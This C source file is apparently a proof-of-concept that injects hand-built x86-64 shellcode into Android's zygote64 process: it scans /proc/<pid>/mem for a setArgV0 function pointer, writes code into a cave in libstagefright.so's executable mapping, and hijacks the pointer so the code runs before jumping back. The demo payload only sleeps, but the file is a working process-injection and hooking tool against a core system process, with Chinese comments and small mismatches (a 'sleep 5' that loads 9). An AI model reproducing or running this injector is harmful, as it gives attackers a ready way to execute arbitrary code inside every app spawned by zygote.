#include "elf_utils.h"
#include "mem_scan.h"
#include "proc_maps.h"

#include <fcntl.h>
#include <inttypes.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define LOG_TAG "HOOK_TEST"
#define LOG_MSG "Hello from Zymbiote Payload!"
#define TARGET_PROC_NAME "zygote64"
#define TARGET_LIB_NAME "libandroid_runtime.so"
#define TARGET_LIB_LOG_NAME "liblog.so"
#define TARGET_LOG_SYMBOL "__android_log_write"
#define TARGET_LIB_SLEEP_NAME "libc.so"
#define TARGET_SLEEP_SYMBOL "usleep"
#define TARGET_SYMBOL                                                          \
  "_Z27android_os_Process_setArgV0P7_JNIEnvP8_jobjectP8_jstring"

static void die(const char *msg) {
  fprintf(stderr, "error: %s\n", msg);
  exit(1);
}

static uint64_t find_payload_cave(int pid) {
  char map_path[64];
  snprintf(map_path, sizeof(map_path), "/proc/%d/maps", pid);

  FILE *fp = fopen(map_path, "r");
  if (!fp)
    return 0;

  char line[1024];
  uint64_t start = 0;
  uint64_t end = 0;
  char perms[16] = {0};
  uint64_t target_addr = 0;

  while (fgets(line, sizeof(line), fp)) {
    if (strstr(line, "libstagefright.so") && strstr(line, "r-xp")) {
      sscanf(line, "%lx-%lx %15s", &start, &end, perms);
      target_addr = end - 0x300;
      break;
    }
  }

  fclose(fp);
  return target_addr;
}

static void write_mem(int fd, uint64_t addr, const void *data, size_t len) {
  if (lseek64(fd, (off64_t)addr, SEEK_SET) == -1) {
    perror("[-] lseek failed");
    exit(1);
  }
  if (write(fd, data, len) != (ssize_t)len) {
    perror("[-] write failed");
    exit(1);
  }
}

static void format_proc_path(char *buf, size_t size, int pid,
                             const char *file) {
  snprintf(buf, size, "/proc/%d/%s", pid, file);
}

int main(int argc, char **argv) {
  int target_pid = -1;

  if (argc == 3 && strcmp(argv[1], "--pid") == 0) {
    target_pid = atoi(argv[2]);
  } else {
    target_pid = find_pid_by_name(TARGET_PROC_NAME);
    if (target_pid <= 0)
      die("zygote64 process not found. Please specify PID with --pid <pid>");
  }

  printf("[+] Target PID: %d\n", target_pid);

  lib_info_t runtime_lib;
  if (!find_lib_info(target_pid, TARGET_LIB_NAME, &runtime_lib))
    die("libandroid_runtime.so not found in target process");

  uint64_t setargv0_offset = 0;
  if (!find_symbol_offset(runtime_lib.path, TARGET_SYMBOL, &setargv0_offset))
    die("failed to find symbol offset in libandroid_runtime.so");

  uint64_t setargv0_addr = runtime_lib.base + setargv0_offset;

  printf("[+] Library: %s\n", runtime_lib.path);
  printf("[+] Library base: 0x%016" PRIx64 "\n", runtime_lib.base);
  printf("[+] Symbol offset: 0x%016" PRIx64 "\n", setargv0_offset);
  printf("[+] Symbol absolute address: 0x%016" PRIx64 "\n", setargv0_addr);

  map_entry_t *heap_maps = NULL;
  size_t heap_map_count = 0;
  if (collect_readable_maps(target_pid, &heap_maps, &heap_map_count) != 0)
    die("no readable heap maps found");

  char mem_path[64];
  format_proc_path(mem_path, sizeof(mem_path), target_pid, "mem");
  int mem_fd = open(mem_path, O_RDONLY);
  if (mem_fd < 0) {
    free(heap_maps);
    die("failed to open /proc/<pid>/mem (need root)");
  }

  uint64_t slot_addr = 0;
  if (scan_for_pointer(mem_fd, setargv0_addr, heap_maps, heap_map_count,
                       &slot_addr) != 0) {
    close(mem_fd);
    free(heap_maps);
    die("pointer not found in heap maps");
  }

  uint64_t slot_value = 0;
  if (pread(mem_fd, &slot_value, sizeof(slot_value), (off_t)slot_addr) !=
      (ssize_t)sizeof(slot_value)) {
    close(mem_fd);
    free(heap_maps);
    die("failed to read slot value");
  }

  close(mem_fd);
  free(heap_maps);

  printf("\n[+] Found pointer at: 0x%016" PRIx64 "\n", slot_addr);
  printf("[+] Slot value: 0x%016" PRIx64 "\n", slot_value);
  printf("[+] setArgV0 absolute address: 0x%016" PRIx64 "\n", setargv0_addr);

  uint64_t payload_addr = find_payload_cave(target_pid);
  if (!payload_addr) {
    printf("[-] Can't find code cave\n");
    return 1;
  }

  lib_info_t sleep_lib;
  if (!find_lib_info(target_pid, TARGET_LIB_SLEEP_NAME, &sleep_lib))
    die("liblog.so not found in target process");

  uint64_t sleep_offset = 0;
  if (!find_symbol_offset(sleep_lib.path, TARGET_SLEEP_SYMBOL, &sleep_offset))
    die("failed to find symbol offset in libc.so");

  uint64_t sleep_addr = sleep_lib.base + sleep_offset;

  printf("[*] Payload Cave: %lx\n", payload_addr);
  printf("[*] uSleep Function: %lx (Offset: %lx)\n", sleep_addr, sleep_offset);

  uint8_t code[512];
  int idx = 0;

  // ================= 1. 保存现场 =================
  // 我们成对Push，确保16字节对齐 (8个寄存器 = 64字节)
  code[idx++] = 0x50; // push rax
  code[idx++] = 0x53; // push rbx
  code[idx++] = 0x51; // push rcx
  code[idx++] = 0x52; // push rdx
  code[idx++] = 0x57; // push rdi
  code[idx++] = 0x56; // push rsi
  code[idx++] = 0x41;
  code[idx++] = 0x50; // push r8
  code[idx++] = 0x41;
  code[idx++] = 0x51; // push r9
  // 注意：如果原程序调用处栈已经对齐，这里 Push 8次(64字节)后依然对齐。
  // 如果崩了，尝试多 Push 一个 r10。

  // ================= 2. 准备参数调用 sleep(5) =================
  // sleep(unsigned int seconds) -> RDI = 5

  code[idx++] = 0x48;
  code[idx++] = 0xc7;
  code[idx++] = 0xc7;
  code[idx++] = 0x09;
  code[idx++] = 0x00;
  code[idx++] = 0x00;
  code[idx++] = 0x00;
  // mov rdi, 5  (睡眠5秒)

  // ================= 3. 调用函数 =================
  code[idx++] = 0x49;
  code[idx++] = 0xbb;
  memcpy(&code[idx], &sleep_addr, 8); // 把 sleep 的绝对地址塞进去
  idx += 8;                           // mov r11, sleep_addr

  code[idx++] = 0x41;
  code[idx++] = 0xff;
  code[idx++] = 0xd3;
  // call r11

  // ================= 4. 恢复现场 =================
  // 顺序与 Push 相反
  code[idx++] = 0x41;
  code[idx++] = 0x59; // pop r9
  code[idx++] = 0x41;
  code[idx++] = 0x58; // pop r8
  code[idx++] = 0x5e; // pop rsi
  code[idx++] = 0x5f; // pop rdi
  code[idx++] = 0x5a; // pop rdx
  code[idx++] = 0x59; // pop rcx
  code[idx++] = 0x5b; // pop rbx
  code[idx++] = 0x58; // pop rax

  // ================= 5. 修复 Hook 并跳回 =================
  // 这里要把原来的函数指针写回去，保证只执行这一次 shellcode，以后正常运行
  // slot_addr 是存放函数指针的内存地址
  // setargv0_addr 是原本的函数地址

  // mov rax, slot_addr
  code[idx++] = 0x48;
  code[idx++] = 0xb8;
  memcpy(&code[idx], &slot_addr, 8);
  idx += 8;

  // mov rcx, setargv0_addr
  code[idx++] = 0x48;
  code[idx++] = 0xb9;
  memcpy(&code[idx], &setargv0_addr, 8);
  idx += 8;

  // mov [rax], rcx  -> 恢复内存中的指针
  code[idx++] = 0x48;
  code[idx++] = 0x89;
  code[idx++] = 0x08;

  // jmp rcx -> 跳回原函数执行
  code[idx++] = 0xff;
  code[idx++] = 0xe1;

  format_proc_path(mem_path, sizeof(mem_path), target_pid, "mem");
  int fd = open(mem_path, O_RDWR);
  if (fd < 0) {
    perror("open mem");
    return 1;
  }

  printf("[*] Injecting %d bytes...\n", idx);
  write_mem(fd, payload_addr, code, idx);
  write_mem(fd, slot_addr, &payload_addr, 8);

  close(fd);
  printf("[SUCCESS] Simple Log Injection Done.\n");
  return 0;
}
